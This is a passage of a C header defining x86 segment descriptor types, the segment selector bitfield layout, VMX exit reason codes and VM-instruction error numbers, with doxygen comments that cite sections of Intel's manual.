    UINT32 BaseAddressUpper;

    /**
     * Base address field (32:63); see description of $BASE_LOW for more details.
     */
    UINT32 MustBeZero;
} SEGMENT_DESCRIPTOR_64;

#define SEGMENT_DESCRIPTOR_TYPE_SYSTEM                               0x00000000
#define SEGMENT_DESCRIPTOR_TYPE_CODE_OR_DATA                         0x00000001
/**
 * @defgroup SEGMENT_DESCRIPTOR_CODE_AND_DATA_TYPE \
 *           Code- and Data-Segment Descriptor Types
 *
 * When the S (descriptor type) flag in a segment descriptor is set, the descriptor is for either a code or a data segment.
 * The highest order bit of the type field (bit 11 of the second double word of the segment descriptor) then determines
 * whether the descriptor is for a data segment (clear) or a code segment (set). For data segments, the three low-order
 * bits of the type field (bits 8, 9, and 10) are interpreted as accessed (A), write-enable (W), and expansion-direction
 * (E). See Table 3-1 for a description of the encoding of the bits in the type field for code and data segments. Data
 * segments can be read-only or read/write segments, depending on the setting of the write-enable bit.
 *
 * @see Vol3A[3.4.5.1(Code- and Data-Segment Descriptor Types)] (reference)
 * @{
 */
 /**
  * Read-Only.
  */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_ONLY                       0x00000000

  /**
   * Data Read-Only, accessed.
   */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_ONLY_ACCESSED              0x00000001

   /**
    * Data Read/Write.
    */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_WRITE                      0x00000002

    /**
     * Data Read/Write, accessed.
     */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_WRITE_ACCESSED             0x00000003

     /**
      * Data Read-Only, expand-down.
      */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_ONLY_EXPAND_DOWN           0x00000004

      /**
       * Data Read-Only, expand-down, accessed.
       */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_ONLY_EXPAND_DOWN_ACCESSED  0x00000005

       /**
        * Data Read/Write, expand-down.
        */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_WRITE_EXPAND_DOWN          0x00000006

        /**
         * Data Read/Write, expand-down, accessed.
         */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_WRITE_EXPAND_DOWN_ACCESSED 0x00000007

         /**
          * Code Execute-Only.
          */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_ONLY                    0x00000008

          /**
           * Code Execute-Only, accessed.
           */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_ONLY_ACCESSED           0x00000009

           /**
            * Code Execute/Read.
            */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_READ                    0x0000000A

            /**
             * Code Execute/Read, accessed.
             */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_READ_ACCESSED           0x0000000B

             /**
              * Code Execute-Only, conforming.
              */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_ONLY_CONFORMING         0x0000000C

              /**
               * Code Execute-Only, conforming, accessed.
               */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_ONLY_CONFORMING_ACCESSED 0x0000000D

               /**
                * Code Execute/Read, conforming.
                */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_READ_CONFORMING         0x0000000E

                /**
                 * Code Execute/Read, conforming, accessed.
                 */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_READ_CONFORMING_ACCESSED 0x0000000F
                 /**
                  * @}
                  */

                  /**
                   * @defgroup SEGMENT_DESCRIPTOR_SYSTEM_TYPE \
                   *           System Descriptor Types
                   *
                   * When the S (descriptor type) flag in a segment descriptor is clear, the descriptor type is a system descriptor. The
                   * processor recognizes the following types of system descriptors:
                   * - Local descriptor-table (LDT) segment descriptor.
                   * - Task-state segment (TSS) descriptor.
                   * - Call-gate descriptor.
                   * - Interrupt-gate descriptor.
                   * - Trap-gate descriptor.
                   * - Task-gate descriptor.
                   * These descriptor types fall into two categories: system-segment descriptors and gate descriptors. Systemsegment
                   * descriptors point to system segments (LDT and TSS segments). Gate descriptors are in themselves "gates," which hold
                   * pointers to procedure entry points in code segments (call, interrupt, and trap gates) or which hold segment selectors
                   * for TSS's (task gates).
                   *
                   * @see Vol3A[3.5(SYSTEM DESCRIPTOR TYPES)] (reference)
                   * @{
                   */
                   /**
                    * - 32-Bit Mode: Reserved
                    * - IA-32e Mode: Reserved
                    */
#define SEGMENT_DESCRIPTOR_TYPE_RESERVED_1                           0x00000000

                    /**
                     * - 32-Bit Mode: 16-bit TSS (Available)
                     * - IA-32e Mode: Reserved
                     */
#define SEGMENT_DESCRIPTOR_TYPE_TSS_16_AVAILABLE                     0x00000001

                     /**
                      * - 32-Bit Mode: LDT
                      * - IA-32e Mode: LDT
                      */
#define SEGMENT_DESCRIPTOR_TYPE_LDT                                  0x00000002

                      /**
                       * - 32-Bit Mode: 16-bit TSS (Busy)
                       * - IA-32e Mode: Reserved
                       */
#define SEGMENT_DESCRIPTOR_TYPE_TSS_16_BUSY                          0x00000003

                       /**
                        * - 32-Bit Mode: 16-bit Call Gate
                        * - IA-32e Mode: Reserved
                        */
#define SEGMENT_DESCRIPTOR_TYPE_CALL_GATE_16                         0x00000004

                        /**
                         * - 32-Bit Mode: Task Gate
                         * - IA-32e Mode: Reserved
                         */
#define SEGMENT_DESCRIPTOR_TYPE_TASK_GATE                            0x00000005

                         /**
                          * - 32-Bit Mode: 16-bit Interrupt Gate
                          * - IA-32e Mode: Reserved
                          */
#define SEGMENT_DESCRIPTOR_TYPE_INTERRUPT_GATE_16                    0x00000006

                          /**
                           * - 32-Bit Mode: 16-bit Trap Gate
                           * - IA-32e Mode: Reserved
                           */
#define SEGMENT_DESCRIPTOR_TYPE_TRAP_GATE_16                         0x00000007

                           /**
                            * - 32-Bit Mode: Reserved
                            * - IA-32e Mode: Reserved
                            */
#define SEGMENT_DESCRIPTOR_TYPE_RESERVED_2                           0x00000008

                            /**
                             * - 32-Bit Mode: 32-bit TSS (Available)
                             * - IA-32e Mode: 64-bit TSS (Available)
                             */
#define SEGMENT_DESCRIPTOR_TYPE_TSS_AVAILABLE                        0x00000009

                             /**
                              * - 32-Bit Mode: Reserved
                              * - IA-32e Mode: Reserved
                              */
#define SEGMENT_DESCRIPTOR_TYPE_RESERVED_3                           0x0000000A

                              /**
                               * - 32-Bit Mode: 32-bit TSS (Busy)
                               * - IA-32e Mode: 64-bit TSS (Busy)
                               */
#define SEGMENT_DESCRIPTOR_TYPE_TSS_BUSY                             0x0000000B

                               /**
                                * - 32-Bit Mode: 32-bit Call Gate
                                * - IA-32e Mode: 64-bit Call Gate
                                */
#define SEGMENT_DESCRIPTOR_TYPE_CALL_GATE                            0x0000000C

                                /**
                                 * - 32-Bit Mode: Reserved
                                 * - IA-32e Mode: Reserved
                                 */
#define SEGMENT_DESCRIPTOR_TYPE_RESERVED_4                           0x0000000D

                                 /**
                                  * - 32-Bit Mode: 32-bit Interrupt Gate
                                  * - IA-32e Mode: 64-bit Interrupt Gate
                                  */
#define SEGMENT_DESCRIPTOR_TYPE_INTERRUPT_GATE                       0x0000000E

                                  /**
                                   * - 32-Bit Mode: 32-bit Trap Gate
                                   * - IA-32e Mode: 64-bit Trap Gate
                                   */
#define SEGMENT_DESCRIPTOR_TYPE_TRAP_GATE                            0x0000000F
                                   /**
                                    * @}
                                    */

                                    /**
                                     * @brief A segment selector is a 16-bit identifier for a segment. It does not point directly to the segment, but instead
                                     *        points to the segment descriptor that defines the segment
                                     *
                                     * @see Vol3A[3.4.2(Segment Selectors)] (reference)
                                     */
typedef union
{
    struct
    {
        /**
         * [Bits 1:0] Specifies the privilege level of the selector. The privilege level can range from 0 to 3, with 0 being the
         * most privileged level.
         *
         * @see Vol3A[5.5(Privilege Levels)]
         */
        UINT16 RequestPrivilegeLevel : 2;
#define SEGMENT_SELECTOR_REQUEST_PRIVILEGE_LEVEL_BIT                 0
#define SEGMENT_SELECTOR_REQUEST_PRIVILEGE_LEVEL_FLAG                0x03
#define SEGMENT_SELECTOR_REQUEST_PRIVILEGE_LEVEL_MASK                0x03
#define SEGMENT_SELECTOR_REQUEST_PRIVILEGE_LEVEL(_)                  (((_) >> 0) & 0x03)

        /**
         * [Bit 2] Specifies the descriptor table to use: clearing this flag selects the GDT; setting this flag selects the current
         * LDT.
         */
        UINT16 Table : 1;
#define SEGMENT_SELECTOR_TABLE_BIT                                   2
#define SEGMENT_SELECTOR_TABLE_FLAG                                  0x04
#define SEGMENT_SELECTOR_TABLE_MASK                                  0x01
#define SEGMENT_SELECTOR_TABLE(_)                                    (((_) >> 2) & 0x01)

        /**
         * [Bits 15:3] Selects one of 8192 descriptors in the GDT or LDT. The processor multiplies the index value by 8 (the number
         * of bytes in a segment descriptor) and adds the result to the base address of the GDT or LDT (from the GDTR or LDTR
         * register, respectively).
         */
        UINT16 Index : 13;
#define SEGMENT_SELECTOR_INDEX_BIT                                   3
#define SEGMENT_SELECTOR_INDEX_FLAG                                  0xFFF8
#define SEGMENT_SELECTOR_INDEX_MASK                                  0x1FFF
#define SEGMENT_SELECTOR_INDEX(_)                                    (((_) >> 3) & 0x1FFF)
    };

    UINT16 Flags;
} SEGMENT_SELECTOR;

/**
 * @}
 */

 /**
  * @defgroup VMX \
  *           VMX
  * @{
  */
  /**
   * @{
   */
   /**
    * @defgroup VMX_BASIC_EXIT_REASONS \
    *           VMX Basic Exit Reasons
    *
    * VMX Basic Exit Reasons.
    *
    * @see Vol3D[C(VMX BASIC EXIT REASONS)] (reference)
    * @{
    */
    /**
     * @brief Exception or non-maskable interrupt (NMI)
     *
     * Either:
     * -# Guest software caused an exception and the bit in the exception bitmap associated with exception's vector was 1. This
     * case includes executions of BOUND that cause \#BR, executions of INT1 (they cause \#DB), executions of INT3 (they cause
     * \#BP), executions of INTO that cause \#OF, and executions of UD0, UD1, and UD2 (they cause \#UD).
     * -# An NMI was delivered to the logical processor and the "NMI exiting" VM-execution control was 1.
     */
#define VMX_EXIT_REASON_EXCEPTION_OR_NMI                             0x00000000

     /**
      * @brief External interrupt
      *
      * An external interrupt arrived and the "external-interrupt exiting" VM-execution control was 1.
      */
#define VMX_EXIT_REASON_EXTERNAL_INTERRUPT                           0x00000001

      /**
       * @brief Triple fault
       *
       * The logical processor encountered an exception while attempting to call the double-fault handler and that exception did
       * not itself cause a VM exit due to the exception bitmap.
       */
#define VMX_EXIT_REASON_TRIPLE_FAULT                                 0x00000002

       /**
        * @brief INIT signal
        *
        * An INIT signal arrived.
        */
#define VMX_EXIT_REASON_INIT_SIGNAL                                  0x00000003

        /**
         * @brief Start-up IPI (SIPI)
         *
         * A SIPI arrived while the logical processor was in the "wait-for-SIPI" state.
         */
#define VMX_EXIT_REASON_STARTUP_IPI                                  0x00000004

         /**
          * @brief I/O system-management interrupt (SMI)
          *
          * An SMI arrived immediately after retirement of an I/O instruction and caused an SMM VM exit.
          *
          * @see Vol3C[34.15.2(SMM VM Exits)]
          */
#define VMX_EXIT_REASON_IO_SMI                                       0x00000005

          /**
           * @brief Other SMI
           *
           * An SMI arrived and caused an SMM VM exit but not immediately after retirement of an I/O instruction.
           *
           * @see Vol3C[34.15.2(SMM VM Exits)]
           */
#define VMX_EXIT_REASON_SMI                                          0x00000006

           /**
            * @brief Interrupt window exiting
            *
            * At the beginning of an instruction, RFLAGS.IF was 1; events were not blocked by STI or by MOV SS; and the
            * "interrupt-window exiting" VM-execution control was 1.
            */
#define VMX_EXIT_REASON_INTERRUPT_WINDOW                             0x00000007

            /**
             * @brief NMI window exiting
             *
             * At the beginning of an instruction, there was no virtual-NMI blocking; events were not blocked by MOV SS; and the
             * "NMI-window exiting" VM-execution control was 1.
             */
#define VMX_EXIT_REASON_NMI_WINDOW                                   0x00000008

             /**
              * @brief Task switch
              *
              * Guest software attempted a task switch.
              */
#define VMX_EXIT_REASON_TASK_SWITCH                                  0x00000009

              /**
               * @brief CPUID
               *
               * Guest software attempted to execute CPUID.
               */
#define VMX_EXIT_REASON_EXECUTE_CPUID                                0x0000000A

               /**
                * @brief GETSEC
                *
                * Guest software attempted to execute GETSEC.
                */
#define VMX_EXIT_REASON_EXECUTE_GETSEC                               0x0000000B

                /**
                 * @brief HLT
                 *
                 * Guest software attempted to execute HLT and the "HLT exiting" VM-execution control was 1.
                 */
#define VMX_EXIT_REASON_EXECUTE_HLT                                  0x0000000C

                 /**
                  * @brief INVD
                  *
                  * Guest software attempted to execute INVD.
                  */
#define VMX_EXIT_REASON_EXECUTE_INVD                                 0x0000000D

                  /**
                   * @brief INVLPG
                   *
                   * Guest software attempted to execute INVLPG and the "INVLPG exiting" VM-execution control was 1.
                   */
#define VMX_EXIT_REASON_EXECUTE_INVLPG                               0x0000000E

                   /**
                    * @brief RDPMC
                    *
                    * Guest software attempted to execute RDPMC and the "RDPMC exiting" VM-execution control was 1.
                    */
#define VMX_EXIT_REASON_EXECUTE_RDPMC                                0x0000000F

                    /**
                     * @brief RDTSC
                     *
                     * Guest software attempted to execute RDTSC and the "RDTSC exiting" VM-execution control was 1.
                     */
#define VMX_EXIT_REASON_EXECUTE_RDTSC                                0x00000010

                     /**
                      * @brief RSM in SMM
                      *
                      * Guest software attempted to execute RSM in SMM.
                      */
#define VMX_EXIT_REASON_EXECUTE_RSM_IN_SMM                           0x00000011

                      /**
                       * @brief VMCALL
                       *
                       * VMCALL was executed either by guest software (causing an ordinary VM exit) or by the executive monitor (causing an SMM
                       * VM exit).
                       *
                       * @see Vol3C[34.15.2(SMM VM Exits)]
                       */
#define VMX_EXIT_REASON_EXECUTE_VMCALL                               0x00000012

                       /**
                        * @brief VMCLEAR
                        *
                        * Guest software attempted to execute VMCLEAR.
                        */
#define VMX_EXIT_REASON_EXECUTE_VMCLEAR                              0x00000013

                        /**
                         * @brief VMLAUNCH
                         *
                         * Guest software attempted to execute VMLAUNCH.
                         */
#define VMX_EXIT_REASON_EXECUTE_VMLAUNCH                             0x00000014

                         /**
                          * @brief VMPTRLD
                          *
                          * Guest software attempted to execute VMPTRLD.
                          */
#define VMX_EXIT_REASON_EXECUTE_VMPTRLD                              0x00000015

                          /**
                           * @brief VMPTRST
                           *
                           * Guest software attempted to execute VMPTRST.
                           */
#define VMX_EXIT_REASON_EXECUTE_VMPTRST                              0x00000016

                           /**
                            * @brief VMREAD
                            *
                            * Guest software attempted to execute VMREAD.
                            */
#define VMX_EXIT_REASON_EXECUTE_VMREAD                               0x00000017

                            /**
                             * @brief VMRESUME
                             *
                             * Guest software attempted to execute VMRESUME.
                             */
#define VMX_EXIT_REASON_EXECUTE_VMRESUME                             0x00000018

                             /**
                              * @brief VMWRITE
                              *
                              * Guest software attempted to execute VMWRITE.
                              */
#define VMX_EXIT_REASON_EXECUTE_VMWRITE                              0x00000019

                              /**
                               * @brief VMXOFF
                               *
                               * Guest software attempted to execute VMXOFF.
                               */
#define VMX_EXIT_REASON_EXECUTE_VMXOFF                               0x0000001A

                               /**
                                * @brief VMXON
                                *
                                * Guest software attempted to execute VMXON.
                                */
#define VMX_EXIT_REASON_EXECUTE_VMXON                                0x0000001B

                                /**
                                 * @brief Control-register accesses
                                 *
                                 * Guest software attempted to access CR0, CR3, CR4, or CR8 using CLTS, LMSW, or MOV CR and the VM-execution control fields
                                 * indicate that a VM exit should occur. This basic exit reason is not used for trap-like VM exits following executions of
                                 * the MOV to CR8 instruction when the "use TPR shadow" VM-execution control is 1. Such VM exits instead use basic exit
                                 * reason 43.
                                 *
                                 * @see Vol3C[25.1(INSTRUCTIONS THAT CAUSE VM EXITS)]
                                 */
#define VMX_EXIT_REASON_MOV_CR                                       0x0000001C

                                 /**
                                  * @brief Debug-register accesses
                                  *
                                  * Guest software attempted a MOV to or from a debug register and the "MOV-DR exiting" VM-execution control was 1.
                                  */
#define VMX_EXIT_REASON_MOV_DR                                       0x0000001D

                                  /**
                                   * @brief I/O instruction
                                   *
                                   * Guest software attempted to execute an I/O instruction and either:
                                   * -# The "use I/O bitmaps" VM-execution control was 0 and the "unconditional I/O exiting" VM-execution control was 1.
                                   * -# The "use I/O bitmaps" VM-execution control was 1 and a bit in the I/O bitmap associated with one of the ports
                                   * accessed by the I/O instruction was 1.
                                   */
#define VMX_EXIT_REASON_EXECUTE_IO_INSTRUCTION                       0x0000001E

                                   /**
                                    * @brief RDMSR
                                    *
                                    * Guest software attempted to execute RDMSR and either:
                                    * -# The "use MSR bitmaps" VM-execution control was 0.
                                    * -# The value of RCX is neither in the range 00000000H - 00001FFFH nor in the range C0000000H - C0001FFFH.
                                    * -# The value of RCX was in the range 00000000H - 00001FFFH and the nth bit in read bitmap for low MSRs is 1, where n was
                                    * the value of RCX.
                                    * -# The value of RCX is in the range C0000000H - C0001FFFH and the nth bit in read bitmap for high MSRs is 1, where n is
                                    * the value of RCX & 00001FFFH.
                                    */
#define VMX_EXIT_REASON_EXECUTE_RDMSR                                0x0000001F

                                    /**
                                     * @brief WRMSR
                                     *
                                     * Guest software attempted to execute WRMSR and either:
                                     * -# The "use MSR bitmaps" VM-execution control was 0.
                                     * -# The value of RCX is neither in the range 00000000H - 00001FFFH nor in the range C0000000H - C0001FFFH.
                                     * -# The value of RCX was in the range 00000000H - 00001FFFH and the nth bit in write bitmap for low MSRs is 1, where n
                                     * was the value of RCX.
                                     * -# The value of RCX is in the range C0000000H - C0001FFFH and the nth bit in write bitmap for high MSRs is 1, where n is
                                     * the value of RCX & 00001FFFH.
                                     */
#define VMX_EXIT_REASON_EXECUTE_WRMSR                                0x00000020

                                     /**
                                      * @brief VM-entry failure due to invalid guest state
                                      *
                                      * A VM entry failed one of the checks identified in Section 26.3.1.
                                      */
#define VMX_EXIT_REASON_ERROR_INVALID_GUEST_STATE                    0x00000021

                                      /**
                                       * @brief VM-entry failure due to MSR loading
                                       *
                                       * A VM entry failed in an attempt to load MSRs. See Section 26.4.
                                       */
#define VMX_EXIT_REASON_ERROR_MSR_LOAD                               0x00000022

                                       /**
                                        * @brief Guest software executed MWAIT
                                        *
                                        * Guest software attempted to execute MWAIT and the "MWAIT exiting" VM-execution control was 1.
                                        */
#define VMX_EXIT_REASON_EXECUTE_MWAIT                                0x00000024

                                        /**
                                         * @brief VM-exit due to monitor trap flag
                                         *
                                         * A VM entry occurred due to the 1-setting of the "monitor trap flag" VM-execution control and injection of an MTF VM exit
                                         * as part of VM entry.
                                         *
                                         * @see Vol3C[25.5.2(Monitor Trap Flag)]
                                         */
#define VMX_EXIT_REASON_MONITOR_TRAP_FLAG                            0x00000025

                                         /**
                                          * @brief Guest software attempted to execute MONITOR
                                          *
                                          * Guest software attempted to execute MONITOR and the "MONITOR exiting" VM-execution control was 1.
                                          */
#define VMX_EXIT_REASON_EXECUTE_MONITOR                              0x00000027

                                          /**
                                           * @brief Guest software attempted to execute PAUSE
                                           *
                                           * Either guest software attempted to execute PAUSE and the "PAUSE exiting" VM-execution control was 1 or the "PAUSE-loop
                                           * exiting" VM-execution control was 1 and guest software executed a PAUSE loop with execution time exceeding PLE_Window.
                                           *
                                           * @see Vol3C[25.1.3(Instructions That Cause VM Exits Conditionally)]
                                           */
#define VMX_EXIT_REASON_EXECUTE_PAUSE                                0x00000028

                                           /**
                                            * @brief VM-entry failure due to machine-check
                                            *
                                            * A machine-check event occurred during VM entry.
                                            *
                                            * @see Vol3C[26.8(MACHINE-CHECK EVENTS DURING VM ENTRY)]
                                            */
#define VMX_EXIT_REASON_ERROR_MACHINE_CHECK                          0x00000029

                                            /**
                                             * @brief TPR below threshold
                                             *
                                             * The logical processor determined that the value of bits 7:4 of the byte at offset 080H on the virtual-APIC page was
                                             * below that of the TPR threshold VM-execution control field while the "use TPR shadow" VMexecution control was 1 either
                                             * as part of TPR virtualization or VM entry.
                                             *
                                             * @see Vol3C[29.1.2(TPR Virtualization)]
                                             * @see Vol3C[26.6.7(VM Exits Induced by the TPR Threshold)]
                                             */
#define VMX_EXIT_REASON_TPR_BELOW_THRESHOLD                          0x0000002B

                                             /**
                                              * @brief APIC access
                                              *
                                              * Guest software attempted to access memory at a physical address on the APIC-access page and the "virtualize APIC
                                              * accesses" VM-execution control was 1.
                                              *
                                              * @see Vol3C[29.4(VIRTUALIZING MEMORY-MAPPED APIC ACCESSES)]
                                              */
#define VMX_EXIT_REASON_APIC_ACCESS                                  0x0000002C

                                              /**
                                               * @brief Virtualized EOI
                                               *
                                               * EOI virtualization was performed for a virtual interrupt whose vector indexed a bit set in the EOIexit bitmap.
                                               */
#define VMX_EXIT_REASON_VIRTUALIZED_EOI                              0x0000002D

                                               /**
                                                * @brief Access to GDTR or IDTR
                                                *
                                                * Guest software attempted to execute LGDT, LIDT, SGDT, or SIDT and the "descriptor-table exiting" VM-execution control
                                                * was 1.
                                                */
#define VMX_EXIT_REASON_GDTR_IDTR_ACCESS                             0x0000002E

                                                /**
                                                 * @brief Access to LDTR or TR
                                                 *
                                                 * Guest software attempted to execute LLDT, LTR, SLDT, or STR and the "descriptor-table exiting" VM-execution control was
                                                 * 1.
                                                 */
#define VMX_EXIT_REASON_LDTR_TR_ACCESS                               0x0000002F

                                                 /**
                                                  * @brief EPT violation
                                                  *
                                                  * An attempt to access memory with a guest-physical address was disallowed by the configuration of the EPT paging
                                                  * structures.
                                                  */
#define VMX_EXIT_REASON_EPT_VIOLATION                                0x00000030

                                                  /**
                                                   * @brief EPT misconfiguration
                                                   *
                                                   * An attempt to access memory with a guest-physical address encountered a misconfigured EPT paging-structure entry.
                                                   */
#define VMX_EXIT_REASON_EPT_MISCONFIGURATION                         0x00000031

                                                   /**
                                                    * @brief INVEPT
                                                    *
                                                    * Guest software attempted to execute INVEPT.
                                                    */
#define VMX_EXIT_REASON_EXECUTE_INVEPT                               0x00000032

                                                    /**
                                                     * @brief RDTSCP
                                                     *
                                                     * Guest software attempted to execute RDTSCP and the "enable RDTSCP" and "RDTSC exiting" VM-execution controls were both
                                                     * 1.
                                                     */
#define VMX_EXIT_REASON_EXECUTE_RDTSCP                               0x00000033

                                                     /**
                                                      * @brief VMX-preemption timer expired
                                                      *
                                                      * The preemption timer counted down to zero.
                                                      */
#define VMX_EXIT_REASON_VMX_PREEMPTION_TIMER_EXPIRED                 0x00000034

                                                      /**
                                                       * @brief INVVPID
                                                       *
                                                       * Guest software attempted to execute INVVPID.
                                                       */
#define VMX_EXIT_REASON_EXECUTE_INVVPID                              0x00000035

                                                       /**
                                                        * @brief WBINVD
                                                        *
                                                        * Guest software attempted to execute WBINVD and the "WBINVD exiting" VM-execution control was 1.
                                                        */
#define VMX_EXIT_REASON_EXECUTE_WBINVD                               0x00000036

                                                        /**
                                                         * @brief XSETBV - Guest software attempted to execute XSETBV
                                                         *
                                                         * Guest software attempted to execute XSETBV.
                                                         */
#define VMX_EXIT_REASON_EXECUTE_XSETBV                               0x00000037

                                                         /**
                                                          * @brief APIC write
                                                          *
                                                          * Guest software completed a write to the virtual-APIC page that must be virtualized by VMM software.
                                                          *
                                                          * @see Vol3C[29.4.3.3(APIC-Write VM Exits)]
                                                          */
#define VMX_EXIT_REASON_APIC_WRITE                                   0x00000038

                                                          /**
                                                           * @brief RDRAND
                                                           *
                                                           * Guest software attempted to execute RDRAND and the "RDRAND exiting" VM-execution control was 1.
                                                           */
#define VMX_EXIT_REASON_EXECUTE_RDRAND                               0x00000039

                                                           /**
                                                            * @brief INVPCID
                                                            *
                                                            * Guest software attempted to execute INVPCID and the "enable INVPCID" and "INVLPG exiting" VM-execution controls were
                                                            * both 1.
                                                            */
#define VMX_EXIT_REASON_EXECUTE_INVPCID                              0x0000003A

                                                            /**
                                                             * @brief VMFUNC
                                                             *
                                                             * Guest software invoked a VM function with the VMFUNC instruction and the VM function either was not enabled or generated
                                                             * a function-specific condition causing a VM exit.
                                                             */
#define VMX_EXIT_REASON_EXECUTE_VMFUNC                               0x0000003B

                                                             /**
                                                              * @brief ENCLS
                                                              *
                                                              * Guest software attempted to execute ENCLS and "enable ENCLS exiting" VM-execution control was 1 and either:
                                                              * -# EAX < 63 and the corresponding bit in the ENCLS-exiting bitmap is 1; or
                                                              * -# EAX >= 63 and bit 63 in the ENCLS-exiting bitmap is 1.
                                                              */
#define VMX_EXIT_REASON_EXECUTE_ENCLS                                0x0000003C

                                                              /**
                                                               * @brief RDSEED
                                                               *
                                                               * Guest software attempted to execute RDSEED and the "RDSEED exiting" VM-execution control was 1.
                                                               */
#define VMX_EXIT_REASON_EXECUTE_RDSEED                               0x0000003D

                                                               /**
                                                                * @brief Page-modification log full
                                                                *
                                                                * The processor attempted to create a page-modification log entry and the value of the PML index was not in the range
                                                                * 0-511.
                                                                */
#define VMX_EXIT_REASON_PAGE_MODIFICATION_LOG_FULL                   0x0000003E

                                                                /**
                                                                 * @brief XSAVES
                                                                 *
                                                                 * Guest software attempted to execute XSAVES, the "enable XSAVES/XRSTORS" was 1, and a bit was set in the logical-AND of
                                                                 * the following three values: EDX:EAX, the IA32_XSS MSR, and the XSS-exiting bitmap.
                                                                 */
#define VMX_EXIT_REASON_EXECUTE_XSAVES                               0x0000003F

                                                                 /**
                                                                  * @brief XRSTORS
                                                                  *
                                                                  * Guest software attempted to execute XRSTORS, the "enable XSAVES/XRSTORS" was 1, and a bit was set in the logical-AND of
                                                                  * the following three values: EDX:EAX, the IA32_XSS MSR, and the XSS-exiting bitmap.
                                                                  */
#define VMX_EXIT_REASON_EXECUTE_XRSTORS                              0x00000040
                                                                  /**
                                                                   * @}
                                                                   */

                                                                   /**
                                                                    * @defgroup VMX_INSTRUCTION_ERROR_NUMBERS \
                                                                    *           VM-Instruction Error Numbers
                                                                    *
                                                                    * VM-Instruction Error Numbers.
                                                                    *
                                                                    * @see Vol3C[30.4(VM INSTRUCTION ERROR NUMBERS)] (reference)
                                                                    * @{
                                                                    */
                                                                    /**
                                                                     * VMCALL executed in VMX root operation.
                                                                     */
#define VMX_ERROR_VMCALL_IN_VMX_ROOT_OPERATION                       0x00000001

                                                                     /**
                                                                      * VMCLEAR with invalid physical address.
                                                                      */
#define VMX_ERROR_VMCLEAR_INVALID_PHYSICAL_ADDRESS                   0x00000002

                                                                      /**
                                                                       * VMCLEAR with VMXON pointer.
                                                                       */
#define VMX_ERROR_VMCLEAR_INVALID_VMXON_POINTER                      0x00000003

                                                                       /**
                                                                        * VMLAUNCH with non-clear VMCS.
                                                                        */
#define VMX_ERROR_VMLAUCH_NON_CLEAR_VMCS                             0x00000004

                                                                        /**
                                                                         * VMRESUME with non-launched VMCS.
                                                                         */
#define VMX_ERROR_VMRESUME_NON_LAUNCHED_VMCS                         0x00000005

                                                                         /**
                                                                          * VMRESUME after VMXOFF (VMXOFF and VMXON between VMLAUNCH and VMRESUME).
                                                                          */
#define VMX_ERROR_VMRESUME_AFTER_VMXOFF                              0x00000006

                                                                          /**
                                                                           * VM entry with invalid control field(s).
                                                                           */
#define VMX_ERROR_VMENTRY_INVALID_CONTROL_FIELDS                     0x00000007

                                                                           /**
                                                                            * VM entry with invalid host-state field(s).
                                                                            */
#define VMX_ERROR_VMENTRY_INVALID_HOST_STATE                         0x00000008

                                                                            /**
                                                                             * VMPTRLD with invalid physical address.
                                                                             */
#define VMX_ERROR_VMPTRLD_INVALID_PHYSICAL_ADDRESS                   0x00000009

                                                                             /**
                                                                              * VMPTRLD with VMXON pointer.
                                                                              */
#define VMX_ERROR_VMPTRLD_VMXON_POINTER                              0x0000000A

                                                                              /**
                                                                               * VMPTRLD with incorrect VMCS revision identifier.
                                                                               */
#define VMX_ERROR_VMPTRLD_INCORRECT_VMCS_REVISION_ID                 0x0000000B

                                                                               /**
                                                                                * VMREAD/VMWRITE from/to unsupported VMCS component.
                                                                                */
#define VMX_ERROR_VMREAD_VMWRITE_INVALID_COMPONENT                   0x0000000C

                                                                                /**
                                                                                 * VMWRITE to read-only VMCS component.
                                                                                 */
#define VMX_ERROR_VMWRITE_READONLY_COMPONENT                         0x0000000D

                                                                                 /**
                                                                                  * VMXON executed in VMX root operation.
                                                                                  */
#define VMX_ERROR_VMXON_IN_VMX_ROOT_OP                               0x0000000F

                                                                                  /**
                                                                                   * VM entry with invalid executive-VMCS pointer.
                                                                                   */
#define VMX_ERROR_VMENTRY_INVALID_VMCS_EXECUTIVE_POINTER             0x00000010

                                                                                   /**
                                                                                    * VM entry with non-launched executive VMCS.
                                                                                    */
#define VMX_ERROR_VMENTRY_NON_LAUNCHED_EXECUTIVE_VMCS                0x00000011

                                                                                    /**
                                                                                     * VM entry with executive-VMCS pointer not VMXON pointer (when attempting to deactivate the dual-monitor treatment of SMIs
                                                                                     * and SMM).
                                                                                     */
#define VMX_ERROR_VMENTRY_EXECUTIVE_VMCS_PTR                         0x00000012

                                                                                     /**
                                                                                      * VMCALL with non-clear VMCS (when attempting to activate the dual-monitor treatment of SMIs and SMM).
                                                                                      */
#define VMX_ERROR_VMCALL_NON_CLEAR_VMCS                              0x00000013

                                                                                      /**
                                                                                       * VMCALL with invalid VM-exit control fields.
                                                                                       */
#define VMX_ERROR_VMCALL_INVALID_VMEXIT_FIELDS                       0x00000014

                                                                                       /**
                                                                                        * VMCALL with incorrect MSEG revision identifier (when attempting to activate the dual-monitor treatment of SMIs and SMM).
                                                                                        */
#define VMX_ERROR_VMCALL_INVALID_MSEG_REVISION_ID                    0x00000016

                                                                                        /**
                                                                                         * VMXOFF under dual-monitor treatment of SMIs and SMM.
                                                                                         */
#define VMX_ERROR_VMXOFF_DUAL_MONITOR                                0x00000017

                                                                                         /**
                                                                                          * VMCALL with invalid SMM-monitor features (when attempting to activate the dual-monitor treatment of SMIs and SMM).
                                                                                          */
#define VMX_ERROR_VMCALL_INVALID_SMM_MONITOR                         0x00000018

                                                                                          /**
                                                                                           * VM entry with invalid VM-execution control fields in executive VMCS (when attempting to return from SMM).
                                                                                           */
